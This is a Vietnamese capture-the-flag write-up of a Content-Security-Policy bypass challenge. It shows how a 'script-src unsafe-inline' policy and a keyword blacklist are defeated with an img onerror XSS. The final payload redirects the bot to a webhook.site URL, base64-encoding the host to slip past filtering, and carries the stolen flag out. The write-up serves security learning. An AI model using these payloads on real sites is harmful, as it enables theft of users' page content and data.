---
title: CSP Bypass - Inline code
id: CSP_Bypass_Inline_code
author: CanardMandarin
description: Too lazy to configure this correctly
points: 35
difficulty: Medium
date: 16-1-2026
share_link: https://share.note.sx/e0lpjgn9#2fAIb0bE8ekEfnTh2WcALaYuCs2F5B/hSqOoCkNj5Ps
share_updated: 2026-01-17T10:55:30+07:00
---

# TL;DR

- Chall được cấu hình csp để chặn các hành vi tấn công như XSS nhưng lại để hổng `script-src 'unsafe-inline'` cho phép chạy mọi script inline kể cả do người dùng cài vào

- Lợi dụng lỗ hổng đó để lấy flag được hiển thị ngay trong source ở phía bot và gửi về phía mình

# Initial reconnaissance

![[Pasted image 20260116035929.png]]

Mở chall lên ta thấy một giao diện yêu cầu người dùng nhập tên

Nhập bừa tên vào thì ta có được giao diện như này:

![[Pasted image 20260116040223.png]]

URL bên dưới chỉ đến một form điền trang web để con bot check

![[Pasted image 20260116043830.png]]

Tên người dùng nhập vào được hiển thị trên url và có một trang để người dùng gửi cái link đó cho con bot cho nên ta có thể nhận thấy ngay đây là một bài về XSS

Vì tên của chall là `CSP Bypass...` nên ở bước này mình mò vào burp suite để xem csp của chall được cấu hình như thế nào và được kết quả sau:

```HTTP
Content-Security-Policy: connect-src 'none'; font-src 'none'; frame-src 'none'; img-src 'self'; manifest-src 'none'; media-src 'none'; object-src 'none'; script-src 'unsafe-inline'; style-src 'self'; worker-src 'none'; frame-ancestors 'none'; block-all-mixed-content;
```

Đem quét trên **CSP Evaluator** thì ta biết có lỗ hổng nằm ở cấu hình `script-src`:

![[Pasted image 20260116040608.png]]

Về cơ bản thì ta có thể hiểu rằng nếu một người dùng có khả năng chèn nội dung tùy ý và được trang web render ra mà không được sanitize kĩ thì hoàn toàn có thể dẫn tới XSS

# Exploit and get flag

Không nghĩ nhiều mình thử chèn script vào luôn

```HTML
<script>alert(0)</script>
```

![[Pasted image 20260116041100.png]]

Tuy bị chặn nhưng ở console không báo lỗi là mình đã vi phạm CSP nên khả năng cao lý do bị chặn là do blacklist từ phía backend

Có lẽ từ khóa `script` đã bị blacklist nên mình thử XSS tiếp bằng `onerror`

```html
<img src=x onerror="alert(0)">
```

![[Pasted image 20260116041401.png]]

Vậy là đã thành công việc còn lại chỉ là lấy flag được cài trong phía source của con bot và gửi về cho mình thôi

Nhìn vào trong source ta thấy flag nằm ở hàm div với class `message` đầu tiên cho nên nếu muốn lấy flag thì chỉ cần bảo nó lấy đúng đoạn đó là được

```js
document.querySelector('.message').textContent
```

Ngoài ra vì CSP được cấu hình để chặn mọi kết nối ra bên ngoài (`connect-src 'none'`) cho nên ta không thể dùng `fetch` mà bắt buộc phải dùng **top level navigation** 

```HTML
<img src=x onerror="location=`https://webhook.site/67ffeb03-2491-4d31-8a4c-3c9559065e7c/?data=${bota(document.querySelector('.message').textContent)}`"
```

![[Pasted image 20260116042316.png]]

Vẫn bị blacklist cái gì đó :<

Nghịch một hồi thì mình phát hiện ra là cả chuỗi `https://webhook.site/` bị blacklist nên mình thử base64 đoạn đấy và cuối cùng cũng có kết quả 

**Payload**:

```HTML
<img src=x onerror="location=atob('aHR0cHM6Ly93ZWJob29rLnNpdGUv')+`67ffeb03-2491-4d31-8a4c-3c9559065e7c/?data=${btoa(document.querySelector('.message').textContent)}`">
```

![[Pasted image 20260116045049.png]]

**Flag**: `CSP_34SY_T0_BYP4S_W1TH_SCR1PT`



